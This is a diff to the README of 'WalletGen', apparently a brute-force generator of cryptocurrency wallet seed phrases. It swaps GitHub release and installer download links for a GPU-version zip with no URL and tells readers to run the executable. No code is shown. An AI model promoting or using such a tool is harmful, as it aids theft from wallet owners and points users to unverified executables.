@@ -73,11 +73,10 @@ Unlike Python-based brute force tools, **WalletGen** is written in C++ and optim
 # How to start
 
 ## Windows 
-- Download [WalletGen.zip](https://github.com/tony-dev1/seed-phrase-generator/releases/download/walletgen/WalletGen_v1.8.0.zip) (5MB)
+- Download [WalletGen-GPU-usage.zip](10MB)
 - Unpack anywhere
-- Run `WalletGen.exe`
+- Run `WalletGenGPU.exe`
 
-Or Just Download [Installer](https://github.com/tony-dev1/seed-phrase-generator/releases/download/walletgen/WalletGen_Windows_v1.8.0.exe)
 
 ## Linux (x86-64bit)
 ```bash
